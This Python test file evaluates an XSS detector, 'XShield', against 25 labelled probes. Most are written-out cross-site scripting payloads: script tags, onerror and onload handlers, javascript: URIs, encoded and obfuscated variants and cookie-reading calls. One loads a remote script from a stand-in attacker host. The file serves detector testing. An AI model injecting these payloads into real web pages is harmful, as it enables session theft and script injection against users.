"""Qualitative Evaluation Test Battery for XShield ML & Hybrid Detectors.

This suite defines 25 curated test cases across 8 distinct attack and benign categories
to evaluate subtle generalization, evasion robustness, and benign preservation without
relying solely on bulk corpus statistics.
"""

from __future__ import annotations

from dataclasses import asdict, dataclass
from pathlib import Path
import sys
from typing import Any, Callable, Sequence

# Ensure project root is on sys.path
PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))


@dataclass(frozen=True)
class QualitativeTestCase:
    """A single qualitative evaluation probe."""

    id: str
    category: str
    category_name: str
    payload: str
    expected_label: int  # 0 = Benign, 1 = XSS
    description: str
    expected_min_action: str  # 'allow', 'flag', 'block'
    max_tolerated_risk: str | None = None  # For benign: must not exceed 'medium' or 'low'


QUALITATIVE_TEST_CASES: list[QualitativeTestCase] = [
    # Category A: Simple XSS (3 cases)
    QualitativeTestCase(
        id="QUAL-A01",
        category="A",
        category_name="Simple XSS",
        payload="<script>alert(1)</script>",
        expected_label=1,
        description="Standard classic script tag execution",
        expected_min_action="block",
    ),
    QualitativeTestCase(
        id="QUAL-A02",
        category="A",
        category_name="Simple XSS",
        payload='<script src="https://evil-hacker.example.com/payload.js"></script>',
        expected_label=1,
        description="Remote external script source inclusion",
        expected_min_action="block",
    ),
    QualitativeTestCase(
        id="QUAL-A03",
        category="A",
        category_name="Simple XSS",
        payload="<SCRIPT>alert('XSS-CAPS')</SCRIPT>",
        expected_label=1,
        description="Uppercase HTML tag case variation",
        expected_min_action="block",
    ),
    # Category B: Event-Handler XSS (4 cases)
    QualitativeTestCase(
        id="QUAL-B01",
        category="B",
        category_name="Event-Handler XSS",
        payload='<img src="x" onerror="alert(document.cookie)">',
        expected_label=1,
        description="Image onerror inline event handler",
        expected_min_action="flag",
    ),
    QualitativeTestCase(
        id="QUAL-B02",
        category="B",
        category_name="Event-Handler XSS",
        payload="<svg onload=alert(document.domain)>",
        expected_label=1,
        description="SVG element onload execution",
        expected_min_action="flag",
    ),
    QualitativeTestCase(
        id="QUAL-B03",
        category="B",
        category_name="Event-Handler XSS",
        payload='<body onload="javascript:alert(1)">',
        expected_label=1,
        description="Body onload event execution",
        expected_min_action="flag",
    ),
    QualitativeTestCase(
        id="QUAL-B04",
        category="B",
        category_name="Event-Handler XSS",
        payload='<input type="text" autofocus onfocus="alert(1)">',
        expected_label=1,
        description="Autofocus event trigger on input element",
        expected_min_action="flag",
    ),
    # Category C: javascript: Pseudo-Protocol URLs (3 cases)
    QualitativeTestCase(
        id="QUAL-C01",
        category="C",
        category_name="javascript: URLs",
        payload="javascript:alert(1)",
        expected_label=1,
        description="Direct javascript: URI payload",
        expected_min_action="flag",
    ),
    QualitativeTestCase(
        id="QUAL-C02",
        category="C",
        category_name="javascript: URLs",
        payload='<a href="javascript:alert(1)">Click for Free Gift</a>',
        expected_label=1,
        description="Anchor tag with javascript pseudo-protocol link",
        expected_min_action="flag",
    ),
    QualitativeTestCase(
        id="QUAL-C03",
        category="C",
        category_name="javascript: URLs",
        payload="javascript:/*--></title></style>*/alert(1);",
        expected_label=1,
        description="Context-breakout comment inside javascript URI",
        expected_min_action="flag",
    ),
    # Category D: Encoded / Entity Payloads (3 cases)
    QualitativeTestCase(
        id="QUAL-D01",
        category="D",
        category_name="Encoded / Entity Payloads",
        payload="%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        expected_label=1,
        description="Percent-encoded script tag payload",
        expected_min_action="flag",
    ),
    QualitativeTestCase(
        id="QUAL-D02",
        category="D",
        category_name="Encoded / Entity Payloads",
        payload="&#60;script&#62;alert(1)&#60;/script&#62;",
        expected_label=1,
        description="Decimal HTML entity encoded script tag",
        expected_min_action="flag",
    ),
    QualitativeTestCase(
        id="QUAL-D03",
        category="D",
        category_name="Encoded / Entity Payloads",
        payload=r"\x3cscript\x3ealert(1)\x3c/script\x3e",
        expected_label=1,
        description="Hexadecimal escaped script tag evasion",
        expected_min_action="flag",
    ),
    # Category E: Obfuscated / Evasion Payloads (3 cases)
    QualitativeTestCase(
        id="QUAL-E01",
        category="E",
        category_name="Obfuscated / Evasion Payloads",
        payload="eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
        expected_label=1,
        description="Character code dynamic string evaluation",
        expected_min_action="flag",
    ),
    QualitativeTestCase(
        id="QUAL-E02",
        category="E",
        category_name="Obfuscated / Evasion Payloads",
        payload='<<SCRIPT>alert("XSS");//<</SCRIPT>',
        expected_label=1,
        description="Nested tag evasion to bypass naive regex strippers",
        expected_min_action="block",
    ),
    QualitativeTestCase(
        id="QUAL-E03",
        category="E",
        category_name="Obfuscated / Evasion Payloads",
        payload="<IMG SRC=JaVaScRiPt:alert('XSS')>",
        expected_label=1,
        description="Mixed-case javascript URI inside image source",
        expected_min_action="flag",
    ),
    # Category F: Syntax-Sparse / Naked JavaScript (3 cases)
    QualitativeTestCase(
        id="QUAL-F01",
        category="F",
        category_name="Syntax-Sparse / Naked JS",
        payload="prompt(1);>",
        expected_label=1,
        description="Syntax-sparse prompt injection with trailing bracket",
        expected_min_action="flag",
    ),
    QualitativeTestCase(
        id="QUAL-F02",
        category="F",
        category_name="Syntax-Sparse / Naked JS",
        payload="confirm(document.cookie);",
        expected_label=1,
        description="Direct JS confirm invocation with cookie extraction",
        expected_min_action="flag",
    ),
    QualitativeTestCase(
        id="QUAL-F03",
        category="F",
        category_name="Syntax-Sparse / Naked JS",
        payload="x:expression8write(1)9>",
        expected_label=1,
        description="Legacy CSS expression style injection vector",
        expected_min_action="flag",
    ),
    # Category G: Benign Developer Discussions (3 cases)
    QualitativeTestCase(
        id="QUAL-G01",
        category="G",
        category_name="Benign Developer Discussions",
        payload="Please review the JavaScript alert system and modal notification components.",
        expected_label=0,
        description="Engineering conversation discussing alerts and JS components",
        expected_min_action="allow",
        max_tolerated_risk="low",
    ),
    QualitativeTestCase(
        id="QUAL-G02",
        category="G",
        category_name="Benign Developer Discussions",
        payload="We should avoid using innerHTML in React and prefer textContent to prevent bugs.",
        expected_label=0,
        description="Security best-practice code review discussion",
        expected_min_action="allow",
        max_tolerated_risk="low",
    ),
    QualitativeTestCase(
        id="QUAL-G03",
        category="G",
        category_name="Benign Developer Discussions",
        payload="The deployment script failed because node index.js timed out waiting for the database.",
        expected_label=0,
        description="DevOps log message containing script and js keywords",
        expected_min_action="allow",
        max_tolerated_risk="low",
    ),
    # Category H: Ordinary Enterprise Web Text (3 cases)
    QualitativeTestCase(
        id="QUAL-H01",
        category="H",
        category_name="Ordinary Enterprise Web Text",
        payload="Order ID: 104928 - Shipment delivered to 123 Main St, Suite 400.",
        expected_label=0,
        description="Standard e-commerce shipping address string",
        expected_min_action="allow",
        max_tolerated_risk="low",
    ),
    QualitativeTestCase(
        id="QUAL-H02",
        category="H",
        category_name="Ordinary Enterprise Web Text",
        payload="Customer contact: john.doe@enterprise-corp.com | Phone: +1-555-0199",
        expected_label=0,
        description="Business contact card with email and phone punctuation",
        expected_min_action="allow",
        max_tolerated_risk="low",
    ),
    QualitativeTestCase(
        id="QUAL-H03",
        category="H",
        category_name="Ordinary Enterprise Web Text",
        payload="Quarterly revenue increased by 14.8% compared to Q3 forecast (target: $2.4M).",
        expected_label=0,
        description="Financial enterprise report snippet with symbols and numbers",
        expected_min_action="allow",
        max_tolerated_risk="low",
    ),
]


def evaluate_qualitative_suite(
    predict_fn: Callable[[str], dict[str, Any]] | None = None,
) -> dict[str, Any]:
    """Evaluate a prediction function or the full XShield pipeline on all qualitative test cases.

    If predict_fn is None, imports and uses XShield's `analyze_security_input`.
    """
    if predict_fn is None:
        from app.services.analysis import analyze_security_input

        def default_evaluator(text: str) -> dict[str, Any]:
            res = analyze_security_input({"input": text})
            ml_prob = res["ml_result"]["probability"]
            rule_suspicious = res["rule_result"]["is_suspicious"]
            action = res["action_result"]["action"]
            risk_level = res["risk_result"]["risk_level"]
            hybrid_score = res["risk_result"]["risk_score"]
            return {
                "ml_probability": ml_prob,
                "rule_suspicious": rule_suspicious,
                "action": action,
                "risk_level": risk_level,
                "risk_score": hybrid_score,
            }

        eval_fn = default_evaluator
    else:
        eval_fn = predict_fn

    results: list[dict[str, Any]] = []
    category_summary: dict[str, dict[str, Any]] = {}
    passed_count = 0
    total_count = len(QUALITATIVE_TEST_CASES)

    action_rank = {"allow": 0, "flag": 1, "block": 2, "block_and_alert": 3}
    risk_rank = {"low": 0, "medium": 1, "high": 2, "critical": 3}

    for case in QUALITATIVE_TEST_CASES:
        eval_result = eval_fn(case.payload)
        action = eval_result.get("action", "").lower()
        risk_level = eval_result.get("risk_level", "").lower()

        # Check compliance
        passed = True
        failure_reasons = []

        if case.expected_label == 1:
            # Must take appropriate defensive action
            expected_rank = action_rank.get(case.expected_min_action, 1)
            actual_rank = action_rank.get(action, 0)
            if actual_rank < expected_rank:
                passed = False
                failure_reasons.append(
                    f"Action '{action}' below required '{case.expected_min_action}'"
                )
        else:
            # Must remain benign / allow
            if action != "allow":
                passed = False
                failure_reasons.append(f"Benign payload triggered action '{action}'")
            if case.max_tolerated_risk:
                max_rank = risk_rank.get(case.max_tolerated_risk.lower(), 0)
                actual_risk_rank = risk_rank.get(risk_level, 0)
                if actual_risk_rank > max_rank:
                    passed = False
                    failure_reasons.append(
                        f"Risk '{risk_level}' exceeds maximum '{case.max_tolerated_risk}'"
                    )

        if passed:
            passed_count += 1

        case_record = {
            "id": case.id,
            "category": case.category,
            "category_name": case.category_name,
            "payload": case.payload,
            "expected_label": case.expected_label,
            "description": case.description,
            "eval_result": eval_result,
            "passed": passed,
            "failure_reasons": failure_reasons,
        }
        results.append(case_record)

        # Aggregate category summary
        cat_stats = category_summary.setdefault(
            case.category,
            {
                "category_name": case.category_name,
                "total": 0,
                "passed": 0,
                "failed": 0,
            },
        )
        cat_stats["total"] += 1
        if passed:
            cat_stats["passed"] += 1
        else:
            cat_stats["failed"] += 1

    return {
        "total_cases": total_count,
        "passed_cases": passed_count,
        "failed_cases": total_count - passed_count,
        "pass_rate_pct": round(passed_count / total_count * 100, 2),
        "category_summary": category_summary,
        "cases": results,
    }


if __name__ == "__main__":
    report = evaluate_qualitative_suite()
    print(f"Qualitative Suite: {report['passed_cases']}/{report['total_cases']} passed ({report['pass_rate_pct']}%)")
    for cat, stats in report["category_summary"].items():
        print(f"  Category {cat} ({stats['category_name']}): {stats['passed']}/{stats['total']} passed")
